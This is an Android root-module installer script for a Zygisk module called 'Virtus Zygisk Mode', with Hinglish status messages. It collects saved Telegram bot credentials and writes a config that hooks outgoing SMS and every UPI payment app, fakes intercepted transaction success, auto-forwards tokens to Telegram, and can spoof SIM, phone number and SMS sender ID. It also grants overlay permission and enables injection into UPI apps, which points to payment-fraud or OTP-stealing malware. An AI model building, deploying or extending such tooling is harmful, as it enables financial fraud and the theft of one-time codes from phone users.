#!/system/bin/sh
# Virtus Zygisk Mode — SAFE install (v1.0.6)

ui_print "*******************************"
ui_print "   Virtus Zygisk Mode           "
ui_print "     v1.0.22 TG TEST FIX         "
ui_print "  Save → Telegram test message  "
ui_print "  SMS hooks in postSpecialize   "
ui_print "  Bubble deferred · creds keep  "
ui_print "  @Hivirtus                     "
ui_print "*******************************"
ui_print "! PhonePe open → bubble → Telegram"
ui_print "! Token+Chat ID → Save → test aayega"

if [ -z "$MODPATH" ]; then
  ui_print "! ERROR: MODPATH not set"
  abort "Installation failed"
fi

ui_print "- Install path: $MODPATH"

set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
[ -d "$MODPATH/ui" ] && set_perm_recursive "$MODPATH/ui" 0 0 0755 0644
[ -d "$MODPATH/docs" ] && set_perm_recursive "$MODPATH/docs" 0 0 0755 0644
[ -f "$MODPATH/bridge.dex" ] && set_perm "$MODPATH/bridge.dex" 0 0 0644
[ -f "$MODPATH/diag_bubble.sh" ] && set_perm "$MODPATH/diag_bubble.sh" 0 0 0755
[ -f "$MODPATH/repair_sim.sh" ] && set_perm "$MODPATH/repair_sim.sh" 0 0 0755
[ -f "$MODPATH/post-fs-data.sh" ] && set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
[ -f "$MODPATH/service.sh" ] && set_perm "$MODPATH/service.sh" 0 0 0755
[ -f "$MODPATH/customize.sh" ] && set_perm "$MODPATH/customize.sh" 0 0 0755
[ -f "$MODPATH/config.json" ] && set_perm "$MODPATH/config.json" 0 0 0644
[ -f "$MODPATH/module.prop" ] && set_perm "$MODPATH/module.prop" 0 0 0644
[ -f "$MODPATH/overlay_install.sh" ] && set_perm "$MODPATH/overlay_install.sh" 0 0 0755

. "$MODPATH/overlay_install.sh" 2>/dev/null
MODDIR="$MODPATH"
# CRITICAL on flash: repair bad APatch config that broke SIM
ui_print "- Repairing SIM/Settings safety..."
hivirtus_repair_sim_settings 2>/dev/null
hivirtus_boot_activate_overlay 2>/dev/null
hivirtus_grant_overlay_permission 2>/dev/null
ui_print "- Zygisk Next Denylist → Unmount Only..."
hivirtus_fix_zn_denylist 2>/dev/null

# Legacy overlay APK cleanup
if command -v pm >/dev/null 2>&1 && pm path com.hivirtus.zygiskmode >/dev/null 2>&1; then
  ui_print "- Removing legacy overlay APK..."
  pm uninstall com.hivirtus.zygiskmode 2>/dev/null || true
fi

if [ ! -f "$MODPATH/zygisk/arm64-v8a.so" ] && [ ! -f "$MODPATH/zygisk/armeabi-v7a.so" ]; then
  ui_print "! WARNING: Native lib missing"
fi

[ -f "$MODPATH/zygisk/arm64-v8a.so" ] && ui_print "- arm64-v8a.so OK"
[ -f "$MODPATH/zygisk/armeabi-v7a.so" ] && ui_print "- armeabi-v7a.so OK (32-bit)"

# Always refresh safe defaults — PRESERVE telegram tokens if already saved
OLD_TG_TOKEN=""
OLD_TG_CHAT=""
for src in \
  /data/local/tmp/hivirtus_telegram_credentials.json \
  /data/local/tmp/hivirtus_ui_save.json \
  /data/local/tmp/hivirtus_zygisk_mode_config.json \
  "$MODPATH/config.json"
do
  [ -f "$src" ] || continue
  [ -z "$OLD_TG_TOKEN" ] && OLD_TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  [ -z "$OLD_TG_CHAT" ] && OLD_TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
done

cat > "$MODPATH/config.json" << EOF
{
  "hide_root": false,
  "hide_developer": false,
  "enable_sim1_mock": false,
  "enable_phone_spoof": false,
  "enable_virtual_sim": false,
  "mock_phone_sim1": "",
  "hook_outgoing_sms": true,
  "intercept_fake_success": true,
  "prefix_enabled": false,
  "prefix_text": "",
  "override_incoming_sender": false,
  "inject_sender_id": "",
  "auto_forward_token": true,
  "fake_intercept_telegram": true,
  "telegram_bot_token": "${OLD_TG_TOKEN}",
  "telegram_chat_id": "${OLD_TG_CHAT}",
  "hook_all_upi_apps": true,
  "auto_hook_foreground": true,
  "log_file": "/data/local/tmp/virtus_zygisk_mode.log"
}
EOF
set_perm "$MODPATH/config.json" 0 0 0644
# Wipe runtime spoof that triggers bad paths — NOT telegram creds
rm -f /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
rm -f /data/local/tmp/hivirtus_hooked_pkgs.txt 2>/dev/null
cp -f "$MODPATH/config.json" /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
chmod 644 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
if [ -n "$OLD_TG_TOKEN" ] && [ -n "$OLD_TG_CHAT" ]; then
  printf '%s\n' "{\"telegram_bot_token\":\"${OLD_TG_TOKEN}\",\"telegram_chat_id\":\"${OLD_TG_CHAT}\"}" \
    > /data/local/tmp/hivirtus_telegram_credentials.json
  chmod 644 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
  ui_print "- Telegram creds preserved — boot pe test jayega"
  echo 1 > /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
  chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
else
  ui_print "- Telegram empty — bubble → Token+Chat → Save"
fi

hivirtus_apatch_allow_upi_inject 2>/dev/null

if [ -d /data/adb/ksu ] || [ -f /dev/kernelsu ]; then
  ui_print "- KernelSU detected"
elif [ -f /data/adb/magisk.db ]; then
  ui_print "- Magisk detected"
elif [ -d /data/adb/ap ] || [ -d /data/adb/apatch ]; then
  ui_print "- APatch detected — phone/settings excluded, UPI inject allowed"
fi

echo "1" > /data/local/tmp/hivirtus_module_installed.flag
chmod 644 /data/local/tmp/hivirtus_module_installed.flag 2>/dev/null
echo "1" > /data/local/tmp/hivirtus_zygisk_native.active
chmod 644 /data/local/tmp/hivirtus_zygisk_native.active 2>/dev/null

ui_print ""
ui_print "Virtus Zygisk Mode v1.0.10"
ui_print "  Zygisk Mode Menu By @Hivirtus"
ui_print "  Madara logo EMBEDDED (always shows)"
ui_print "  Crash-safe native menu"
ui_print "  Flash → REBOOT → tap logo"
ui_print ""
ui_print "Agar SIM abhi bhi gayab:"
ui_print "  adb shell su -c 'sh /data/adb/modules/hivirtus_zygisk_mode/repair_sim.sh'"
ui_print "  phir reboot"
ui_print ""
ui_print "No LSPosed needed."
